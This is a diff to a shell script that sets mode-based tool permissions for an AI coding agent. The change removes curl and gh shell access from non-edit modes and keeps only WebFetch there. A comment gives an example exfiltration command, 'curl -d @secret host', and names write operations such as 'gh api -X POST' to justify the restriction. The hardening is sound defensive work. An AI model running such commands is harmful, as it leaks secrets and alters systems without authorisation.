@@ -130,18 +130,27 @@ EDIT_HARD_TOOLS="Read,Grep,Glob,LS,Bash,Edit,Write"
 # Network access is OFF by default. Pallium sets PALLIUM_WORKFLOW_NETWORK=1
 # only when this agent both requested `network: true` AND the run was started
 # with `--allow-network` (the operator ceiling); it is "0" otherwise. When
-# granted, expose a small set of networked tools so the worker can reach
-# GitHub/HTTP. WebFetch is also added to the hard `--tools` set below because
-# `--tools` is a hard cap on which built-in tools exist at all — listing
-# WebFetch only in --allowedTools would leave it unavailable. The mode-based
-# filesystem gating (Edit/Write still denied for non-edit modes) is left
-# intact; network only widens egress, not write scope. Trade-off worth
-# knowing: like every `Bash(prefix:*)` entry, `curl`/`gh` are prefix matches
-# (e.g. `curl -o` could write a file), which is the accepted cost of an
-# explicit, opt-in escape hatch — never reached unless both yeses are present.
-NET_ALLOWED_TOOLS=""
+# granted, expose networked tools — but scoped by mode, because only "edit"
+# runs in an isolated worktree; test/check/read-only run against the LIVE
+# checkout.
+#
+# Non-edit modes (read-only/test/check) get ONLY WebFetch: Claude's native,
+# side-effect-free fetch. They deliberately do NOT get raw `Bash(curl:*)` or
+# `Bash(gh:*)` — on a live checkout those are prefix matches that enable raw
+# exfiltration (`curl -d @secret host`) and write operations (`gh api -X POST`,
+# `curl -o` clobbering a tracked file). The broader curl/gh escape hatch is
+# reserved for "edit" mode, whose blast radius is a disposable worktree.
+#
+# WebFetch is also added to the hard `--tools` set below because `--tools` is a
+# hard cap on which built-in tools exist at all — listing WebFetch only in
+# --allowedTools would leave it unavailable. The mode-based filesystem gating
+# (Edit/Write still denied for non-edit modes) is left intact; network only
+# widens egress, not write scope.
+NET_EDIT_TOOLS=""
+NET_NONEDIT_TOOLS=""
 if [ "${PALLIUM_WORKFLOW_NETWORK:-0}" = "1" ]; then
-  NET_ALLOWED_TOOLS=",WebFetch,Bash(gh:*),Bash(curl:*)"
+  NET_NONEDIT_TOOLS=",WebFetch"
+  NET_EDIT_TOOLS=",WebFetch,Bash(gh:*),Bash(curl:*)"
   NON_EDIT_HARD_TOOLS="$NON_EDIT_HARD_TOOLS,WebFetch"
   EDIT_HARD_TOOLS="$EDIT_HARD_TOOLS,WebFetch"
 fi
@@ -150,7 +159,7 @@ HARDENING_ARGS=(--safe-mode --setting-sources user --strict-mcp-config)
 NON_EDIT_ISOLATION_ARGS=("${HARDENING_ARGS[@]}" --permission-mode plan --tools "$NON_EDIT_HARD_TOOLS")
 case "${PALLIUM_WORKFLOW_MODE:-read-only}" in
   edit)
-    PERM_ARGS=("${HARDENING_ARGS[@]}" --tools "$EDIT_HARD_TOOLS" --permission-mode acceptEdits --allowedTools "$EDIT_TOOLS$NET_ALLOWED_TOOLS")
+    PERM_ARGS=("${HARDENING_ARGS[@]}" --tools "$EDIT_HARD_TOOLS" --permission-mode acceptEdits --allowedTools "$EDIT_TOOLS$NET_EDIT_TOOLS")
     ;;
   test|check)
     # NOTE: npm test/pytest execute the repo's own test code, which is
@@ -162,10 +171,10 @@ case "${PALLIUM_WORKFLOW_MODE:-read-only}" in
     # the run a disposable checkout; it doesn't and can't limit the test
     # code itself. Only use test/check against repos whose test code you
     # trust, and prefer isolation: "worktree" for anything you don't.
-    PERM_ARGS=("${NON_EDIT_ISOLATION_ARGS[@]}" --allowedTools "$TEST_TOOLS$NET_ALLOWED_TOOLS" --disallowedTools "Edit,Write,NotebookEdit")
+    PERM_ARGS=("${NON_EDIT_ISOLATION_ARGS[@]}" --allowedTools "$TEST_TOOLS$NET_NONEDIT_TOOLS" --disallowedTools "Edit,Write,NotebookEdit")
     ;;
   *)
-    PERM_ARGS=("${NON_EDIT_ISOLATION_ARGS[@]}" --allowedTools "$READ_TOOLS$NET_ALLOWED_TOOLS" --disallowedTools "Edit,Write,NotebookEdit")
+    PERM_ARGS=("${NON_EDIT_ISOLATION_ARGS[@]}" --allowedTools "$READ_TOOLS$NET_NONEDIT_TOOLS" --disallowedTools "Edit,Write,NotebookEdit")
     ;;
 esac
 
